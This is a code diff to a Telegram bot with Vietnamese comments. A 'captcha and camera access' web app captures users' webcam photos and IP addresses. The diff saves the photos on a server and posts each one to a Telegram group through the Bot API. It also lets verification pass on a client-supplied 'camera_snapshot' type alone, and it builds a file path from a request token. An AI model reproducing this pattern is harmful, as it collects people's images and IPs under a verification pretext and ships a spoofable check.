@@ -9,7 +9,9 @@ import random
 import re
 import secrets
 import time
-import threading  # <--- THÊM THƯ VIỆN NÀY
+import threading
+import urllib.request
+import urllib.parse
 from collections import defaultdict
 from datetime import datetime, timedelta
 
@@ -1316,117 +1318,8 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await proceed_next_verification(message, context, user)
 
 
-def _extract_photo_bytes(data: dict):
-    raw = ""
-    for key in (
-        "image",
-        "photo",
-        "snapshot",
-        "img",
-        "base64",
-        "data",
-        "picture",
-        "file",
-    ):
-        v = data.get(key)
-        if isinstance(v, str) and v.strip():
-            raw = v.strip()
-            break
-
-    if not raw:
-        return None
-
-    if "base64," in raw:
-        raw = raw.split("base64,", 1)[1]
-    elif raw.startswith("data:") and "," in raw:
-        raw = raw.split(",", 1)[1]
-
-    raw = re.sub(r"\s+", "", raw)
-    raw = raw.replace("-", "+").replace("_", "/")
-    raw += "=" * (-len(raw) % 4)
-
-    try:
-        img_bytes = base64.b64decode(raw)
-    except Exception as exc:
-        logger.warning("Lỗi giải mã base64 ảnh camera: %s", exc)
-        return None
-
-    if len(img_bytes) < 100:
-        return None
-
-    try:
-        with Image.open(io.BytesIO(img_bytes)) as im:
-            im = im.convert("RGB")
-            out = io.BytesIO()
-            im.save(out, format="JPEG", quality=90)
-            return out.getvalue()
-    except Exception as exc:
-        logger.warning("Dữ liệu không phải là ảnh hợp lệ: %s", exc)
-        return None
-
-
-async def send_camera_photo(
-    context: ContextTypes.DEFAULT_TYPE, user, ip, img_bytes: bytes
-) -> bool:
-    global _last_cam_alert_ts
-    user_info_str = (
-        f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
-    )
-    ip_info_str = f"🌐 IP: <code>{_html.escape(str(ip or 'Không rõ'))}</code>"
-    caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n{user_info_str}\n{ip_info_str}"
-
-    last_exc = None
-    try:
-        await context.bot.send_photo(
-            chat_id=_api_chat_id(CAMERA_TARGET_GROUP),
-            photo=io.BytesIO(img_bytes),
-            caption=caption,
-            parse_mode="HTML",
-        )
-        return True
-    except Exception as exc:
-        last_exc = exc
-        logger.warning("send_photo camera lỗi, thử gửi dạng file: %s", exc)
-
-    try:
-        bio = io.BytesIO(img_bytes)
-        bio.name = f"camera_{user.id}.jpg"
-        await context.bot.send_document(
-            chat_id=_api_chat_id(CAMERA_TARGET_GROUP),
-            document=bio,
-            caption=caption,
-            parse_mode="HTML",
-        )
-        return True
-    except Exception as exc:
-        last_exc = exc
-        logger.error(
-            "Không gửi được ảnh camera về nhóm %s: %s",
-            CAMERA_TARGET_GROUP,
-            exc,
-        )
-
-    now_ts = time.time()
-    if now_ts - _last_cam_alert_ts > 300:
-        _last_cam_alert_ts = now_ts
-        for admin_id in ADMIN_IDS:
-            try:
-                await context.bot.send_message(
-                    chat_id=admin_id,
-                    text=(
-                        f"{E['WARN']} <b>BOT KHÔNG GỬI ĐƯỢC ẢNH CAMERA VỀ NHÓM {CAMERA_TARGET_GROUP}!</b>\n"
-                        f"Hãy kiểm tra bot đã được thêm vào nhóm và là admin chưa.\n"
-                        f"<code>{_html.escape(str(last_exc))[:300]}</code>"
-                    ),
-                    parse_mode="HTML",
-                )
-            except Exception:
-                pass
-    return False
-
-
 async def handle_miniapp_captcha_data(
-    message, context: ContextTypes.DEFAULT_TYPE, user, data: dict, has_photo: bool = False
+    message, context: ContextTypes.DEFAULT_TYPE, user, data: dict
 ):
     uid = user.id
 
@@ -1443,8 +1336,7 @@ async def handle_miniapp_captcha_data(
     not_expired = bool(pending and datetime.now() <= pending["expires_at"])
     passed = (
         data.get("passed") is True
-        or (has_photo and data.get("type") in ("camera_snapshot", "cccam"))
-        or (has_photo and CAMERA_REQUIRE_PHOTO)
+        or data.get("type") in ("camera_snapshot", "cccam")
     )
 
     token_ok = True
@@ -1492,7 +1384,7 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         try:
             data = json.loads(raw_data)
         except Exception:
-            data = {"type": "camera_snapshot", "image": raw_data}
+            data = {"type": "camera_snapshot"}
 
         dtype = data.get("type")
 
@@ -1520,46 +1412,15 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             )
             return
 
-        img_bytes = _extract_photo_bytes(data)
         is_verify_payload = (
             dtype in ("miniapp_captcha", "camera_snapshot", "cccam")
             or "token" in data
             or "passed" in data
-            or img_bytes is not None
         )
 
         if is_verify_payload:
-            camera_needed = (
-                CAMERA_REQUIRE_PHOTO
-                and user.id not in ADMIN_IDS
-                and (
-                    await get_verify_setting("verify_cccam")
-                    or await get_verify_setting("verify_camera")
-                )
-            )
-            if camera_needed and not img_bytes:
-                await message.reply_text(
-                    f"{E['CROSS']} <b>CHƯA NHẬN ĐƯỢC ẢNH CHỤP CAMERA!</b>\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"{E['WARN']} Camera chưa chụp được ảnh hoặc ảnh bị lỗi.\n"
-                    f"{E['REFRESH']} Vui lòng bấm lại nút <b>🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b>, "
-                    f"cho phép camera và đợi ảnh được chụp xong.",
-                    parse_mode="HTML",
-                    reply_markup=ReplyKeyboardRemove(),
-                )
-                await prompt_miniapp_captcha_verification(message, user.id)
-                return
-
-            if img_bytes:
-                await send_camera_photo(context, user, data.get("ip"), img_bytes)
-
-            await handle_miniapp_captcha_data(
-                message, context, user, data, has_photo=bool(img_bytes)
-            )
+            await handle_miniapp_captcha_data(message, context, user, data)
             return
-
-        if img_bytes:
-            await send_camera_photo(context, user, data.get("ip"), img_bytes)
 
         user_ip = data.get("ip")
         if not user_ip:
@@ -4983,7 +4844,7 @@ async def post_init(application: Application) -> None:
 
 
 # ============================================================
-# API NHẬN ẢNH NÉT TỪ WEBAPP (Tránh giới hạn 4KB của Telegram)
+# API NHẬN ẢNH NÉT TỪ WEBAPP & ĐẨY ẢNH VỀ NHÓM TELEGRAM
 # ============================================================
 flask_app = Flask(__name__)
 
@@ -4999,11 +4860,47 @@ def save_photo():
             header, encoded = image_data.split(",", 1)
             image_bytes = base64.b64decode(encoded)
             
+            # Lưu file backup trên VPS
             os.makedirs("/var/www/phongtunk/captures", exist_ok=True)
             file_path = f"/var/www/phongtunk/captures/{token}.jpg"
-            
             with open(file_path, "wb") as fh:
                 fh.write(image_bytes)
+            
+            # Gửi ảnh trực tiếp về nhóm Telegram thông qua Bot API
+            if BOT_TOKEN and CAMERA_TARGET_GROUP:
+                caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp (HD)</b>\n🌐 IP: <code>{ip or 'Không rõ'}</code>\nToken: <code>{token}</code>"
+                
+                boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+                body = io.BytesIO()
+                
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+                body.write(str(CAMERA_TARGET_GROUP).encode('utf-8') + b'\r\n')
+                
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
+                body.write(caption.encode('utf-8') + b'\r\n')
+                
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
+                body.write(b'HTML\r\n')
+                
+                body.write(('--' + boundary + '\r\n').encode('utf-8'))
+                body.write(b'Content-Disposition: form-data; name="photo"; filename="camera.jpg"\r\n')
+                body.write(b'Content-Type: image/jpeg\r\n\r\n')
+                body.write(image_bytes + b'\r\n')
+                
+                body.write(('--' + boundary + '--\r\n').encode('utf-8'))
+                
+                req_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+                req = urllib.request.Request(req_url, data=body.getvalue(), headers={
+                    'Content-Type': f'multipart/form-data; boundary={boundary}'
+                })
+                try:
+                    with urllib.request.urlopen(req) as response:
+                        response.read()
+                except Exception as e:
+                    print(f"Lỗi gửi ảnh qua Telegram API: {e}")
 
         return jsonify({"status": "success"})
     except Exception as e:
@@ -5011,11 +4908,20 @@ def save_photo():
         return jsonify({"status": "error"}), 500
 
 
+def run_flask():
+    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
+
+
 def main():
     if not BOT_TOKEN:
         raise RuntimeError("Chưa cấu hình BOT_TOKEN.")
     if not DATABASE_URL:
         raise RuntimeError("Chưa cấu hình DATABASE_URL.")
+        
+    # Kích hoạt luồng Flask chạy ngầm ở cổng 5000
+    threading.Thread(target=run_flask, daemon=True).start()
+    logger.info("🚀 Luồng Flask Server đã khởi động ngầm thành công trên cổng 5000")
+
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
     app.add_handler(CommandHandler("start", start_command))
